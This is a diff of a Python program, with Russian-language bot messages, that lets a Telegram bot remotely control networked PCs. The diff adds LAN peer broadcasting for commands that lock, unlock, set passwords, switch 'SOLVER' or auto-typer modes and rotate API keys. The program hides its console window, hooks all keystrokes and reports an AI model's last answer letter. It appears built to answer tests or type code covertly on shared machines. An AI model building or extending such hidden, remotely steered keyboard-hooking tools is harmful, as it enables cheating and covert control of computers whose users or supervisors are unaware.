+                        state.unlocked_at      = 0.0
                         cfg = load_config()
                         cfg["solver_password"] = sub
                         save_config(cfg)
-                        tg_send_message(
-                            f"👂 <b>ОЖИДАНИЕ КОДА С КЛАВИАТУРЫ ВКЛЮЧЕНО</b>\n"
-                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                            f"🖥 <code>{state.pc_name}</code>\n"
-                            f"🔑 Код: <code>{sub}</code>\n"
-                            f"Солвер <b>LOCKED</b>. Бот слушает нажатия клавиш на ПК.\n"
-                            f"Как только на ПК наберут <code>{sub}</code>, солвер автоматически разблокируется! 🚀"
-                        )
-                    else:
-                        pwd = getattr(state, "solver_password", "")
-                        if not pwd:
-                            tg_send_message("⚠️ Пароль еще не задан.\nИспользуйте: <code>/setpass &lt;пароль&gt;</code> или <code>/pass &lt;пароль&gt;</code>")
-                        else:
-                            state.solver_unlocked  = False
-                            state.key_listener_active = True
-                            state.key_buffer       = ""
+                        if target_pc is not None and target_pc == pc_lower:
                             tg_send_message(
                                 f"👂 <b>ОЖИДАНИЕ КОДА С КЛАВИАТУРЫ ВКЛЮЧЕНО</b>\n"
                                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                                 f"🖥 <code>{state.pc_name}</code>\n"
-                                f"🔑 Ожидаемый код: <code>{pwd}</code>\n"
-                                f"Солвер <b>LOCKED</b>. Наберите код на клавиатуре ПК для разблокировки."
+                                f"🔑 Код: <code>{sub}</code>\n"
+                                f"Солвер <b>LOCKED</b>. Введите код на клавиатуре ПК для разблокировки."
                             )
+                        elif target_pc is None:
+                            peers = get_online_peers(timeout=0.35)
+                            sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                            if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                                tg_send_message(
+                                    f"🔐 <b>ОБЩИЙ ПАРОЛЬ УСТАНОВЛЕН:</b> <code>{sub}</code>\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"Все ПК в сети ({len(peers)} шт.) переведены в <b>LOCKED</b>.\n"
+                                    f"Наберите <code>{sub}</code> на клавиатуре нужного ПК для разблокировки! 🚀"
+                                )
+                    else:
+                        pwd = getattr(state, "solver_password", "")
+                        if not pwd:
+                            if target_pc is not None and target_pc == pc_lower:
+                                tg_send_message("⚠️ Пароль еще не задан.\nИспользуйте: <code>/setpass &lt;пароль&gt;</code> или <code>/pass &lt;пароль&gt;</code>")
+                            elif target_pc is None:
+                                peers = get_online_peers(timeout=0.35)
+                                sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                                if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                                    tg_send_message("⚠️ Пароль еще не задан.\nИспользуйте: <code>/setpass &lt;пароль&gt;</code> или <code>/pass &lt;пароль&gt;</code>")
+                        else:
+                            cancel_auto_lock_timer()
+                            state.solver_unlocked  = False
+                            state.key_listener_active = True
+                            state.key_buffer       = ""
+                            state.unlocked_at      = 0.0
+                            if target_pc is not None and target_pc == pc_lower:
+                                tg_send_message(
+                                    f"👂 <b>ОЖИДАНИЕ КОДА С КЛАВИАТУРЫ ВКЛЮЧЕНО</b>\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"🖥 <code>{state.pc_name}</code>\n"
+                                    f"🔑 Ожидаемый код: <code>{pwd}</code>\n"
+                                    f"Солвер <b>LOCKED</b>. Наберите код на клавиатуре ПК для разблокировки."
+                                )
+                            elif target_pc is None:
+                                peers = get_online_peers(timeout=0.35)
+                                sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                                if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                                    tg_send_message(
+                                        f"👂 <b>ОЖИДАНИЕ КОДА С КЛАВИАТУРЫ ВКЛЮЧЕНО</b>\n"
+                                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                        f"Все ПК в сети ({len(peers)} шт.) переведены в <b>LOCKED</b>.\n"
+                                        f"🔑 Ожидаемый код: <code>{pwd}</code>\n"
+                                        f"Наберите код на клавиатуре нужного ПК для разблокировки!"
+                                    )
 
                 # -- /setpass -- set general password (for all PCs) ------
                 elif cmd in ("/setpass", "/set_pass", "/setpassword"):
@@ -1515,26 +1823,60 @@ def tg_bot_poller():
                     if not new_pwd:
                         tg_send_message("⚠️ Укажите пароль: <code>/setpass &lt;новый_пароль&gt;</code>")
                     else:
+                        cancel_auto_lock_timer()
                         state.solver_password  = new_pwd
                         state.solver_unlocked  = False
                         state.key_listener_active = True
                         state.key_buffer       = ""
+                        state.unlocked_at      = 0.0
                         cfg = load_config()
                         cfg["solver_password"] = new_pwd
                         save_config(cfg)
-                        tg_send_message(
-                            f"🔐 <b>ОБЩИЙ ПАРОЛЬ УСТАНОВЛЕН:</b> <code>{new_pwd}</code>\n"
-                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                            f"🖥 <code>{state.pc_name}</code>\n"
-                            f"Солвер <b>LOCKED</b>. Включено ожидание ввода с клавиатуры.\n"
-                            f"Наберите <code>{new_pwd}</code> на ПК для разблокировки!"
-                        )
+                        if target_pc is not None and target_pc == pc_lower:
+                            tg_send_message(
+                                f"🔐 <b>ПАРОЛЬ УСТАНОВЛЕН:</b> <code>{new_pwd}</code> на <code>{state.pc_name}</code>\n"
+                                f"Солвер <b>LOCKED</b>. Введите код на клавиатуре для разблокировки."
+                            )
+                        elif target_pc is None:
+                            peers = get_online_peers(timeout=0.35)
+                            sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                            if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                                tg_send_message(
+                                    f"🔐 <b>ОБЩИЙ ПАРОЛЬ УСТАНОВЛЕН:</b> <code>{new_pwd}</code>\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"Все ПК в сети ({len(peers)} шт.) <b>LOCKED</b>.\n"
+                                    f"Наберите код на клавиатуре нужного ПК для разблокировки! 🚀"
+                                )
 
                 # -- /lock -- manually lock solver ----------------------
                 elif cmd in ("/lock", "/lockdown"):
+                    cancel_auto_lock_timer()
                     state.solver_unlocked = False
+                    state.key_listener_active = True if bool(getattr(state, "solver_password", "")) else False
                     state.key_buffer = ""
-                    tg_send_message(f"🔒 Solver <b>LOCKED</b> on <code>{state.pc_name}</code>.")
+                    state.unlocked_at = 0.0
+                    if target_pc is not None and target_pc == pc_lower:
+                        tg_send_message(f"🔒 Solver <b>LOCKED</b> on <code>{state.pc_name}</code>.")
+                    elif target_pc is None:
+                        peers = get_online_peers(timeout=0.35)
+                        sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                        if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                            tg_send_message(f"🔒 <b>ВСЕ ПК ЗАБЛОКИРОВАНЫ</b> (LOCKED, {len(peers)} шт.).")
+
+                # -- /unlock -- manually unlock solver --------------------
+                elif cmd in ("/unlock", "/разблок"):
+                    cancel_auto_lock_timer()
+                    state.solver_unlocked = True
+                    state.key_listener_active = False
+                    state.key_buffer = ""
+                    start_auto_lock_timer(7200.0)
+                    if target_pc is not None and target_pc == pc_lower:
+                        tg_send_message(f"🔓 Solver <b>UNLOCKED</b> on <code>{state.pc_name}</code> (автолок через 2 часа).")
+                    elif target_pc is None:
+                        peers = get_online_peers(timeout=0.35)
+                        sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                        if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                            tg_send_message(f"🔓 <b>ВСЕ ПК РАЗБЛОКИРОВАНЫ</b> на 2 часа ({len(peers)} шт.).")
 
                 # ── /set_logfile ──────────────────────────────────
                 elif cmd == "/set_logfile":
@@ -1586,58 +1928,137 @@ def tg_bot_poller():
 
                 # ── /status ───────────────────────────────────────
                 elif cmd == "/status":
-                    me = {"SOLVER": "🎯", "TYPER_PYTHON": "🐍", "TYPER_CPP": "⚙️"}.get(state.mode, "💻")
-                    si = "⏳ Busy" if state.busy else ("🔒 Locked" if not getattr(state, "solver_unlocked", False) else "✅ Ready")
-                    tg_send_message(
-                        f"┌──────────────────────┐\n"
-                        f"│  📊 <b>SYSTEM STATUS</b>       │\n"
-                        f"└──────────────────────┘\n\n"
-                        f"🖥 PC:         <code>{state.pc_name}</code>\n"
-                        f"⚡ State:      <b>{si}</b>\n"
-                        f"{me} Mode:       <b>{state.mode}</b>\n"
-                        f"🔑 Active Key: <code>#{state.active_key_index}</code> ({mask_key(state.api_key)})\n"
-                        f"   • #1: <code>{mask_key(state.api_key_1)}</code>\n"
-                        f"   • #2: <code>{mask_key(state.api_key_2)}</code>\n"
-                        f"   • #3: <code>{mask_key(state.api_key_3)}</code>\n"
-                        f"🤖 Model:      <code>{state.model_solver}</code>\n"
-                        f"🎯 Last Ans:   <b>{state.last_letter}</b>\n"
-                        f"🔐 Solver:     <b>{'👂 Listening keys...' if getattr(state, 'key_listener_active', False) else ('Unlocked' if state.solver_unlocked else 'Locked')}</b>\n"
-                        f"📹 Webcam:     <b>{'✅ Ready (cv2)' if cv2 is not None else '⚠️ Not installed'}</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
-                    )
+                    if target_pc is not None and target_pc == pc_lower:
+                        me = {"SOLVER": "🎯", "TYPER_PYTHON": "🐍", "TYPER_CPP": "⚙️"}.get(state.mode, "💻")
+                        si = "⏳ Busy" if state.busy else ("🔒 Locked" if not getattr(state, "solver_unlocked", False) else "✅ Ready")
+                        rem_str = ""
+                        if getattr(state, "solver_unlocked", False) and getattr(state, "unlocked_at", 0) > 0:
+                            rem_m = max(0, int(7200 - (time.time() - state.unlocked_at))) // 60
+                            rem_str = f" ({rem_m}м до автолока)"
+                        tg_send_message(
+                            f"┌──────────────────────┐\n"
+                            f"│  📊 <b>SYSTEM STATUS</b>       │\n"
+                            f"└──────────────────────┘\n\n"
+                            f"🖥 PC:         <code>{state.pc_name}</code>\n"
+                            f"⚡ State:      <b>{si}</b>\n"
+                            f"{me} Mode:       <b>{state.mode}</b>\n"
+                            f"🔑 Active Key: <code>#{state.active_key_index}</code> ({mask_key(state.api_key)})\n"
+                            f"   • #1: <code>{mask_key(state.api_key_1)}</code>\n"
+                            f"   • #2: <code>{mask_key(state.api_key_2)}</code>\n"
+                            f"   • #3: <code>{mask_key(state.api_key_3)}</code>\n"
+                            f"🤖 Model:      <code>{state.model_solver}</code>\n"
+                            f"🎯 Last Ans:   <b>{state.last_letter}</b>\n"
+                            f"🔐 Solver:     <b>{'👂 Listening keys...' if getattr(state, 'key_listener_active', False) else (('Unlocked' + rem_str) if state.solver_unlocked else 'Locked')}</b>\n"
+                            f"📹 Webcam:     <b>{'✅ Ready (cv2)' if cv2 is not None else '⚠️ Not installed'}</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
+                        )
+                    elif target_pc is None:
+                        peers = get_online_peers(timeout=0.35)
+                        show_every = has_every or any(a.lower().startswith("ever") or a.lower() in ("all", "все", "всё", "*") for a in args)
+                        display_peers = peers if show_every else {k: v for k, v in peers.items() if v.get("unlocked") is True}
+                        pool = display_peers if display_peers else peers
+                        sorted_pool = sorted(pool.keys(), key=lambda x: x.lower())
+                        if sorted_pool and state.pc_name.lower() == sorted_pool[0].lower():
+                            header = f"📊 <b>SYSTEM STATUS ({len(display_peers)}):</b>" if show_every else f"📊 <b>SYSTEM STATUS (Активных: {len(display_peers)}):</b>"
+                            if not display_peers:
+                                tg_send_message(
+                                    f"🔒 <b>НЕТ АКТИВНЫХ ПК (пароль не введен)</b>\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"Все ПК в сети сейчас заблокированы.\n"
+                                    f"💡 <i>Чтобы увидеть все ПК:</i> <code>/status every</code>"
+                                )
+                            else:
+                                sorted_pcs = sorted(display_peers.keys(), key=lambda x: x.lower())
+                                lines = []
+                                for idx, p_name in enumerate(sorted_pcs, 1):
+                                    info = display_peers[p_name]
+                                    p_icon = info.get("icon", "💻")
+                                    p_mode = info.get("mode", "SOLVER")
+                                    p_stat = info.get("status", "Unknown")
+                                    s_icon = "🔒" if p_stat == "Locked" else ("⏳" if p_stat == "Busy" else "✅")
+                                    rem_str = ""
+                                    u_at = info.get("unlocked_at", 0.0)
+                                    if info.get("unlocked") and u_at > 0:
+                                        rem_m = max(0, int(7200 - (time.time() - u_at))) // 60
+                                        rem_str = f" ({rem_m}м)"
+                                    k_idx = info.get("key_index", 1)
+                                    lines.append(f"<b>{idx}.</b> 🖥 <code>{p_name}</code> [{p_icon} <b>{p_mode}</b> | {s_icon} <b>{p_stat}</b>{rem_str} | 🔑 #{k_idx}]")
+                                body = "\n".join(lines)
+                                tip = "💡 <i>Все ПК: <code>/status every</code> | Таргет: <code>@Имя /status</code></i>" if not show_every else "💡 <i>Таргет: <code>@Имя /status</code></i>"
+                                tg_send_message(f"{header}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n{body}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n{tip}")
 
                 # ── /solver /python /cpp ──────────────────────────
                 elif cmd == "/solver":
                     with state.lock: state.mode = "SOLVER"
-                    tg_send_message(f"✅ [<code>{state.pc_name}</code>] Mode: <b>SOLVER</b>")
+                    if target_pc is not None and target_pc == pc_lower:
+                        tg_send_message(f"✅ [<code>{state.pc_name}</code>] Mode: <b>SOLVER</b>")
+                    elif target_pc is None:
+                        peers = get_online_peers(timeout=0.35)
+                        sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                        if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                            tg_send_message(f"✅ Режим <b>SOLVER</b> установлен на всех ПК ({len(peers)} шт.).")
                 elif cmd in ("/typer_py", "/python"):
                     with state.lock: state.mode = "TYPER_PYTHON"
-                    tg_send_message(f"✅ [<code>{state.pc_name}</code>] Mode: <b>TYPER_PYTHON</b>")
+                    if target_pc is not None and target_pc == pc_lower:
+                        tg_send_message(f"✅ [<code>{state.pc_name}</code>] Mode: <b>TYPER_PYTHON</b>")
+                    elif target_pc is None:
+                        peers = get_online_peers(timeout=0.35)
+                        sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                        if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                            tg_send_message(f"✅ Режим <b>TYPER_PYTHON</b> установлен на всех ПК ({len(peers)} шт.).")
                 elif cmd in ("/typer_cpp", "/cpp"):
                     with state.lock: state.mode = "TYPER_CPP"
-                    tg_send_message(f"✅ [<code>{state.pc_name}</code>] Mode: <b>TYPER_CPP</b>")
+                    if target_pc is not None and target_pc == pc_lower:
+                        tg_send_message(f"✅ [<code>{state.pc_name}</code>] Mode: <b>TYPER_CPP</b>")
+                    elif target_pc is None:
+                        peers = get_online_peers(timeout=0.35)
+                        sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                        if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                            tg_send_message(f"✅ Режим <b>TYPER_CPP</b> установлен на всех ПК ({len(peers)} шт.).")
 
                 # ── /key ──────────────────────────────────────────
                 elif cmd in ("/key", "/keys"):
                     sub = args[0].lower() if args else ""
                     if sub in ("1", "2", "3"):
                         ok, info = switch_api_key(int(sub))
-                        tg_send_message(f"🔑 [<code>{state.pc_name}</code>] {info}")
+                        if target_pc is not None and target_pc == pc_lower:
+                            tg_send_message(f"🔑 [<code>{state.pc_name}</code>] {info}")
+                        elif target_pc is None:
+                            peers = get_online_peers(timeout=0.35)
+                            sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                            if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                                tg_send_message(f"🔑 Активный API ключ переключен на слот <b>#{sub}</b> на всех ПК ({len(peers)} шт.).")
                     else:
-                        tg_send_message(
-                            f"🔑 <b>API KEYS ({state.pc_name}):</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                            f"{'👉 ' if state.active_key_index==1 else '   '}<b>#1:</b> <code>{mask_key(state.api_key_1)}</code>\n"
-                            f"{'👉 ' if state.active_key_index==2 else '   '}<b>#2:</b> <code>{mask_key(state.api_key_2)}</code>\n"
-                            f"{'👉 ' if state.active_key_index==3 else '   '}<b>#3:</b> <code>{mask_key(state.api_key_3)}</code>\n"
-                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                            f"• Switch: <code>/key 1|2|3</code>\n"
-                            f"• Change: <code>/change key 1 &lt;KEY&gt;</code>\n"
-                            f"• Delete: <code>/del key 1|2|3</code>"
-                        )
-            time.sleep(random.uniform(0.8, 1.5))
+                        if target_pc is not None and target_pc == pc_lower:
+                            tg_send_message(
+                                f"🔑 <b>API KEYS ({state.pc_name}):</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                f"{'👉 ' if state.active_key_index==1 else '   '}<b>#1:</b> <code>{mask_key(state.api_key_1)}</code>\n"
+                                f"{'👉 ' if state.active_key_index==2 else '   '}<b>#2:</b> <code>{mask_key(state.api_key_2)}</code>\n"
+                                f"{'👉 ' if state.active_key_index==3 else '   '}<b>#3:</b> <code>{mask_key(state.api_key_3)}</code>\n"
+                                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                f"• Switch: <code>/key 1|2|3</code>\n"
+                                f"• Change: <code>/change key 1 &lt;KEY&gt;</code>\n"
+                                f"• Delete: <code>/del key 1|2|3</code>"
+                            )
+                        elif target_pc is None:
+                            peers = get_online_peers(timeout=0.35)
+                            sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                            if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                                tg_send_message(
+                                    f"🔑 <b>API KEYS ({state.pc_name}):</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"{'👉 ' if state.active_key_index==1 else '   '}<b>#1:</b> <code>{mask_key(state.api_key_1)}</code>\n"
+                                    f"{'👉 ' if state.active_key_index==2 else '   '}<b>#2:</b> <code>{mask_key(state.api_key_2)}</code>\n"
+                                    f"{'👉 ' if state.active_key_index==3 else '   '}<b>#3:</b> <code>{mask_key(state.api_key_3)}</code>\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"• Переключить на всех ПК: <code>/key 1|2|3</code>\n"
+                                    f"• На конкретном ПК: <code>@Имя /key 1|2|3</code>"
+                                )
+            # Ultra-fast polling interval (0.35-0.55s) over keep-alive session for instant responses
+            time.sleep(random.uniform(0.35, 0.55))
 
-        except Exception:
-            time.sleep(2.5)
+        except Exception as e:
+            log(f"Telegram poller exception: {e}")
+            time.sleep(1.0)
 
 
 # ─── MAIN ─────────────────────────────────────────────────────────────────────
@@ -1662,6 +2083,7 @@ def main():
     hide_console_window()
 
     keyboard.hook(on_global_hotkey)
+    threading.Thread(target=lan_peer_listener,  daemon=True).start()
     threading.Thread(target=tg_bot_poller,     daemon=True).start()
     threading.Thread(target=log_watcher_thread, daemon=True).start()
 
